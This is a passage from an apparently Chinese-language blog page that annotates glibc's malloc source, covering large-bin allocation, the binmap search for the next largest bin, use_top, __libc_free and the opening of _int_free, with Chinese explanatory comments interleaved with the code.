class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsorted大循环结束, 避免花费过多时间在unsortedbin的处理上</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//回想一下, 循环之前判断了fastbin和smallbin, 到largebin的时候先malloc_consolidate清理fastbin到unsortedbin,</span><br><span class="hljs-comment">//从unsortedbin中一个个取出,历经last_remainer,exact fit和放入相应bin中后, 循环中只判断了从unsortedbin中取出的块</span><br><span class="hljs-comment">//即合并之后的chunk,并且没有一块和nb相等.由于smallbin每个bin大小一致,也就是说两次比较smallbin中都没有合适的chunk,</span><br><span class="hljs-comment">//跳出循环之后直接找 *largechunk* 里的即可, 并且是find smallest that fits, 不一定要刚刚好</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idx是nb定位出来的idx,在大循环之前,到这里说明是largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//如果该largebin非空 且 最大的不小于nb</span><br>           <span class="hljs-comment">//为了反向遍历,victim指向最后一个最小的largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//找出第一个不小于nb的块, 并且赋值size为这个chunk的大小</span><br>           <span class="hljs-comment">//如果有多个相同大小的chunk, victim会定位到第一个有fd_nextsize指针的chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//如果从largebin链表中选取的victim不是链表中的最后一个chunk,并且与victim大小相同的chunk不止一个</span><br>           <span class="hljs-comment">//意味着victim为chunk size链表中的节点</span><br>           <span class="hljs-comment">//为了避免调整chunksize链表, 将victim的fd作为候选chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>   <span class="hljs-comment">//准备分割,unlink取出victim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//如果剩下的小于MINSIZE就把整个victim给出去</span><br>               <span class="hljs-comment">//例行设置inuse_bit和non_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//如果过大就要分割</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//取出剩下的chunk指针, 前面写过相关过程</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//插入unsortedbin头部</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//简单的检查,防止fwd被篡改</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//插入完成</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebin就设置一下</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbin中刚好的--&gt;fastbin合并后+unsortedbin中刚好的--&gt;用nb定位的largebin_idx中不小于的</span><br><span class="hljs-comment">//以上这些全部失败之后进行下面的操作,寻找比当前idx更大的idx</span><br>   ++idx;<span class="hljs-comment">//直接+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//使用bitmap能够避免循环判断+1后的idx指向的链表是不是空的</span><br><span class="hljs-comment">//除了mark_bin unmark_bin get_binmap其他binmap函数都不涉及 binmap数组, 只是单纯的移位运算</span><br>   block = idx2block(idx);<span class="hljs-comment">//算出block</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//取出map</span><br>   bit = idx2bit(idx);<span class="hljs-comment">//算出该位的bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//大循环,找到后 or 没有--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//当前bit为0 或者 chunk后面的bit也等于0(bit &gt; map), idx2bit()不可能得到0,应该是循环下面的部分</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//没有的话只能够使用top chunk了</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<span class="hljs-comment">//不等零</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));<span class="hljs-comment">//取到了更大且非空的bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.没有经过上面的if,原map中就大于等于bit, 从原bit位开始左移</span><br>       <span class="hljs-comment">//2.经过了上面的if,bit从最低位开始左移</span><br>       <span class="hljs-comment">//从bit位开始找bin header, 肯定是存在的</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//既然比nb都大, 就选一个最右边的, 这样在largebin中还是最小的</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span><br>       <span class="hljs-comment">// 这种情况发生的概率应该很小。</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//不够就整块送出去</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//够了就分割</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// 如果在small bin范围内，就将其标记为remainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   没看懂写了啥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">         less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">         be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">         limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">         MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">         exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">         reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">         to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">       */</span><br><br>    victim = av-&gt;top;<br>    size = chunksize(victim);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE))<br>    &#123;<span class="hljs-comment">//如果top足够大, 就分割</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(victim, nb);<br>        av-&gt;top = remainder;<br>        set_head(victim, nb | PREV_INUSE |<br>                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br><span class="hljs-comment">//详细的检查, 只有在MALLOC_DEBUG为1时启用</span><br>        check_malloced_chunk(av, victim, nb);<br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>    <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">         here for all block sizes.  */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>    &#123;<span class="hljs-comment">//如果不够大且当前arena有fastchunk, 再次malloc_consolidate()等待下一次循环是否可行</span><br>        malloc_consolidate(av);<br>        <span class="hljs-comment">/* restore original bin index */</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>            idx = smallbin_index(nb);<br>        <span class="hljs-keyword">else</span><br>            idx = largebin_index(nb);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">       */</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-comment">//啥都没有, 直接sysmalloc()增加topchunk,并且return跳出循环</span><br>        <span class="hljs-keyword">void</span> *p = sysmalloc(nb, av);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __libc_free(<span class="hljs-keyword">void</span> *mem) &#123;<br>    mstate    ar_ptr;<br>    mchunkptr p; <span class="hljs-comment">/* chunk corresponding to mem */</span><br>    <span class="hljs-comment">// 判断是否有钩子函数 __free_hook</span><br>    <span class="hljs-keyword">void</span> (*hook)(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) = atomic_forced_read(__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, RETURN_ADDRESS(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// free NULL没有作用</span><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>) <span class="hljs-comment">/* free(0) has no effect */</span><br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 将mem转换为chunk状态</span><br>    p = mem2chunk(mem);<br>    <span class="hljs-comment">// 如果该块内存是mmap得到的</span><br>    <span class="hljs-keyword">if</span> (chunk_is_mmapped(p)) <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>        <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span><br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;<br>            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;<br>            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;<br>            mp_.mmap_threshold = chunksize(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                       mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        munmap_chunk(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    MAYBE_INIT_TCACHE (); <span class="hljs-comment">//唯一的tcache</span><br>    <br>    <span class="hljs-comment">// 根据chunk获得分配区的指针</span><br>    ar_ptr = arena_for_chunk(p);<br>    <span class="hljs-comment">// 执行释放</span><br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="变量定义-1"><a href="#变量定义-1" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* associated fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* next contiguous chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> nextinuse;               <span class="hljs-comment">/* true if nextchunk is used */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* size of previous contiguous chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> locked = <span class="hljs-number">0</span>;<br><br>  size = chunksize (p);<br></code></pre></div></td></tr></table></figure><h3 id="小检查-amp-tcache"><a href="#小检查-amp-tcache" class="headerlink" title="小检查 &amp; tcache"></a>小检查 &amp; tcache</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-comment">/* Little security check which won&#x27;t hurt performance: the</span><br><span class="hljs-comment">       allocator never wrapps around at the end of the address space.</span><br><span class="hljs-comment">       Therefore we can exclude some size values which might appear</span><br><span class="hljs-comment">       here by accident or by &quot;design&quot; from some intruder.  */</span><br>    <span class="hljs-comment">// 指针不能指向非法的地址, 必须小于等于-size，为什么？？？</span><br>    <span class="hljs-comment">// 指针必须得对齐，2*SIZE_SZ 这个对齐</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect((<span class="hljs-keyword">uintptr_t</span>) p &gt; (<span class="hljs-keyword">uintptr_t</span>) -size, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(misaligned_chunk(p), <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;free(): invalid 